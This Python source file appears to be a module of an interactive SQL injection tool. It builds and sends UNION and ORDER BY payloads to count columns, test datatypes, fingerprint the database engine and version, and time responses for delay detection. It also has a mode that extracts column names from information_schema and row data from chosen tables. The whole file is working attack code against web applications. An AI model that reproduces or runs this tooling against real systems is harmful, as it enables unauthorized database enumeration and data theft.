from time import perf_counter
from utils import to_int_safe, timed_send, _short_hash, sql_escape, parse_multi_indices
from payload_handlers import expand_single_payload_string
from obfuscator import Obfuscator

def run_column_counter(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return
    print("\n=== Column Count Helper ===")
    print("1) ORDER BY test")
    print("2) UNION NULL test")
    print("9) Back")
    sel = input("> ").strip()
    if sel in ("9", "۹"):
        return

    max_cols = 50
    comment_styles = ["-- ", "#"]
    with_quotes = [True, False]

    def _send_payload(p):
        built = ic.prepare_injection(p)
        if not built: return []
        rows = []
        for lbl, req in built.items():
            r, dt = timed_send(ic, req, quiet=True)
            if r is None:
                rows.append((lbl, None, None, None, None))
                continue
            body = r.text or ""
            rows.append((lbl, r.status_code, len(body), _short_hash(body), dt))
        return rows

    print("\n[ORDER BY scan]")
    for com in comment_styles:
        for q in with_quotes:
            print(f"\n== Using comment=[{com.strip()}], quotes={'yes' if q else 'no'} ==")
            for i in range(1, max_cols+1):
                payload = (f"' ORDER BY {i}{com}" if q else f" ORDER BY {i}{com}")
                rows = _send_payload(payload)
                if not rows:
                    print(f"[i={i}] send failed.")
                    continue
                sample = rows[0]
                print(f"[i={i}] -> status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")

    print("\n[UNION NULL scan]")
    for com in comment_styles:
        for q in with_quotes:
            print(f"\n== Using comment=[{com.strip()}], quotes={'yes' if q else 'no'} ==")
            for i in range(1, max_cols+1):
                nulls = ",".join(["NULL"]*i)
                payload = (f"' UNION SELECT {nulls}{com}" if q else f" UNION SELECT {nulls}{com}")
                rows = _send_payload(payload)
                if not rows:
                    print(f"[cols={i}] send failed.")
                    continue
                sample = rows[0]
                print(f"[cols={i}] -> status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")

def run_datatype_tester(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    try:
        col_count = int(input("Number of columns in UNION: ").strip())
        col_count = max(1, min(col_count, 32))
    except:
        print("[-] Invalid number.")
        return

    qneed = input("Does value need quotes? 1(yes)/0(no): ").strip()
    with_quotes = (qneed in ("1", "۱", "yes", "y"))

    tests = {
        "string": "'dmDyCT'",
        "int": "123",
        "float": "3.14",
        "bool": "TRUE",
        "time": "2024-01-01",
        "null": "NULL"
    }
    comment_styles = ["-- ", "#"]

    def _send_payload(p):
        built = ic.prepare_injection(p)
        if not built: return []
        rows = []
        for lbl, req in built.items():
            r, dt = timed_send(ic, req, quiet=True)
            if r is None:
                rows.append((lbl, None, None, None, None))
                continue
            body = r.text or ""
            rows.append((lbl, r.status_code, len(body), _short_hash(body), dt))
        return rows

    for com in comment_styles:
        for dtype, val in tests.items():
            print(f"\n== dtype={dtype}  comment={com.strip()} ==")
            for i in range(col_count):
                cols = ["NULL"] * col_count
                cols[i] = val
                pay = f"UNION SELECT {','.join(cols)}{com}"
                if with_quotes:
                    pay = "'" + " " + pay
                rows = _send_payload(pay)
                if not rows:
                    print(f"[col {i+1}] send failed.")
                    continue
                sample = rows[0]
                print(f"[col {i+1}] status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")

def run_version_probe(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    try:
        col_count = int(input("Number of columns in UNION: ").strip())
        col_count = max(1, min(col_count, 32))
    except:
        print("[-] Invalid number.")
        return

    qneed = input("Does value need quotes? 1(yes)/0(no): ").strip()
    with_quotes = (qneed in ("1", "۱", "yes", "y"))

    versions = {
        "MySQL/MSSQL": "@@version",
        "PostgreSQL": "version()",
        "Oracle(v$version)": "banner FROM v$version",
        "Oracle(v$instance)": "version FROM v$instance"
    }

    try:
        target_col = int(input(f"Which column (1–{col_count}) holds the version expr? ").strip())
        assert 1 <= target_col <= col_count
    except:
        print("[-] Invalid column index.")
        return

    def _send_payload(p):
        built = ic.prepare_injection(p)
        if not built: return []
        rows = []
        for lbl, req in built.items():
            r, dt = timed_send(ic, req, quiet=True)
            if r is None:
                rows.append((lbl, None, None, None, None))
                continue
            body = r.text or ""
            rows.append((lbl, r.status_code, len(body), _short_hash(body), dt))
        return rows

    comment_styles = ["-- ", "#"]
    for com in comment_styles:
        for engine, expr in versions.items():
            cols = ["NULL"] * col_count
            cols[target_col-1] = expr
            pay_core = f"SELECT {','.join(cols)}"
            pay = f"UNION {pay_core}{com}"
            if with_quotes:
                pay = "'" + " " + pay
            rows = _send_payload(pay)
            print(f"\n[{engine}] {pay}")
            if not rows:
                print(" send failed.")
                continue
            sample = rows[0]
            print(f" status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")

def run_db_info_interactive(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    try:
        col_count = int(input("Number of columns in UNION: ").strip())
        col_count = max(1, min(col_count, 32))
    except:
        print("[-] Invalid number.")
        return

    qneed = input("Does the payload need quotes? 1(yes)/0(no): ").strip()
    with_quotes = (qneed in ("1", "۱", "yes", "y"))

    mode = input("1: Custom payload  |  2: List columns of a table  |  3: Extract data from a table\n>>> ").strip()
    cols = ["NULL"] * col_count
    from_clause = ""
    where_clause = ""

    if mode == "2":
        table = input("Table name: ").strip()
        while True:
            try:
                idx = int(input(f"Column index (1–{col_count}) for column_name: ").strip())
                if 1 <= idx <= col_count: break
            except: pass
        cols[idx-1] = "column_name"
        from_clause = " FROM information_schema.columns"
        where_clause = f" WHERE table_name='{sql_escape(table)}'"

    elif mode == "3":
        table = input("Table name: ").strip()
        for i in range(col_count):
            v = input(f"Column {i+1} name (leave empty for NULL): ").strip()
            if v: cols[i] = sql_escape(v)
        from_clause = f" FROM {sql_escape(table)}"

    elif mode == "1":
        try:
            n = int(input("How many columns to fill? ").strip())
            assert 1 <= n <= col_count
        except:
            print("[-] Invalid number.")
            return
        for _ in range(n):
            while True:
                try:
                    idx = int(input(f"Target column index (1–{col_count}): ").strip())
                    if 1 <= idx <= col_count: break
                except: pass
            v = input(f"Value/expression for column {idx} (e.g., column_name, version(), 'abc'): ")
            cols[idx-1] = sql_escape(v) if "'" in v else v

        add_from = input("Add FROM clause? (y/n): ").strip().lower()
        if add_from == "y":
            from_clause = " FROM " + sql_escape(input("Table/view name: ").strip())
    else:
        print("[-] Invalid mode.")
        return

    core = f"SELECT {','.join(cols)}{from_clause}{where_clause}"
    payload = f"UNION {core}-- "
    if with_quotes:
        payload = "'" + " " + payload

    built = ic.prepare_injection(payload)
    if not built:
        print("[-] Prepare failed.")
        return

    print(f"\nPayload: {payload}\n")
    for lbl, req in built.items():
        r, dt = timed_send(ic, req, quiet=True)
        if r is None:
            print(f"{lbl} -> send failed")
            continue
        print(f"{lbl}: status={r.status_code} len={len(r.text)} hash={_short_hash(r.text)} time={dt:.3f}s")

def run_column_counter_advanced(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    try:
        max_c = int(input("Max columns to try (e.g., 12): ").strip() or "12")
        max_c = max(1, min(max_c, 64))
    except:
        max_c = 12

    qneed_in = input("Does target need a breaking quote? 1(yes)/0(no) [default 1]: ").strip()
    need_quotes = (qneed_in in ("", "1", "۱", "y", "yes"))

    print("\nWhich DBMS profiles to test? (comma-separated or 'all'):")
    dbms_names = list(Obfuscator().dbms_config.keys())
    for i, name in enumerate(dbms_names, 1):
        print(f"  {i}. {name}")
    sel = input("> ").strip().lower()
    chosen = []
    if sel in ("", "all", "a", "*"):
        chosen = dbms_names
    else:
        try:
            idxs = parse_multi_indices(sel, len(dbms_names))
            for i in idxs:
                chosen.append(dbms_names[i-1])
        except:
            chosen = dbms_names

    use_comment_styles = ["-- ", "--+", "#", "/*"]

    tb_in = input("\nEnable time-based probe per DBMS? 1(yes)/0(no) [default 1]: ").strip()
    enable_time = (tb_in in ("", "1", "۱", "y", "yes"))
    try:
        tb_sec = float(input("Time delay seconds (default 2): ").strip() or "2")
        if tb_sec < 1e-3: tb_sec = 2.0
    except:
        tb_sec = 2.0
    try:
        threshold = float(input("Timeout threshold to flag 'delay' (seconds, default 1.2): ").strip() or "1.2")
    except:
        threshold = 1.2

    def _req_builder(payload: str):
        return ic.prepare_injection(payload)

    def _send_and_measure(req_builder, label: str, payload: str):
        prepared = req_builder(payload)
        if not prepared:
            return []
        rows = []
        for rk, req in prepared.items():
            t0 = perf_counter()
            r = ic.send(req)
            t1 = perf_counter()
            if r is None:
                rows.append((label, rk, None, None, None, t1 - t0, "send-failed"))
            else:
                body = r.text or ""
                rows.append((label, rk, r.status_code, len(body), _short_hash(body), t1 - t0, "ok"))
        return rows

    def _print_rows(rows):
        for (label, rk, st, ln, hh, dt, note) in rows:
            print(f"{label} @ {rk}\n  -> status={st} len={ln} hash={hh} time={dt:.3f}s note={note}")

    print("\n[+] Running DBMS hint probes (version/time). We WILL NOT decide; only printing raw outcomes.")
    for name in chosen:
        obf = Obfuscator(name)
        comment_pool = list(dict.fromkeys(use_comment_styles + obf.dbms_config[name]["comment_style"]))

        # Version probe via UNION
        for com in comment_pool:
            vexpr = obf.dbms_config[name]["functions"]["version"][0] if "functions" in obf.dbms_config[name] else "@@version"
            cols = [vexpr] + ["NULL"] * (max_c - 1)
            core = f"SELECT {','.join(cols)}"
            pay = f"UNION {core}"
            pay = ("' " + pay) if need_quotes else (" " + pay)
            pay += com
            rows = _send_and_measure(_req_builder, f"[{name}][version-probe:{com.strip()}]", pay)
            _print_rows(rows)

        if enable_time:
            for com in comment_pool:
                time_expr = obf.dbms_config[name]["time_func"].format(tb_sec)
                cols = [time_expr] + ["NULL"] * (max_c - 1)
                core = f"SELECT {','.join(cols)}"
                pay = f"UNION {core}"
                pay = ("' " + pay) if need_quotes else (" " + pay)
                pay += com
                rows = _send_and_measure(_req_builder, f"[{name}][time-probe:{com.strip()}]", pay)
                _print_rows(rows)
                for row in rows:
                    if row[5] >= threshold:
                        print(f"  -> DELAY detected (time={row[5]:.3f}s >= {threshold}s)")

    print("\n[+] ORDER BY scan (generic, no DBMS-lock-in)")
    for com in use_comment_styles:
        print(f"\n== comment=[{com}] quotes={'yes' if need_quotes else 'no'} ==")
        for i in range(1, max_c + 1):
            pay = f"ORDER BY {i}"
            pay = ("' " + pay) if need_quotes else (" " + pay)
            pay += com
            rows = _send_and_measure(_req_builder, f"[ORDERBY i={i}:{com.strip()}]", pay)
            _print_rows(rows)

    print("\n[+] UNION NULL scan (generic)")
    for com in use_comment_styles:
        print(f"\n== comment=[{com}] quotes={'yes' if need_quotes else 'no'} ==")
        for i in range(1, max_c + 1):
            nulls = ",".join(["NULL"] * i)
            pay = f"UNION SELECT {nulls}"
            pay = ("' " + pay) if need_quotes else (" " + pay)
            pay += com
            rows = _send_and_measure(_req_builder, f"[UNION-NULL cols={i}:{com.strip()}]", pay)
            _print_rows(rows)

    print("\n[Done] Advanced column-count scans finished. Review status/len/hash/time and decide manually.")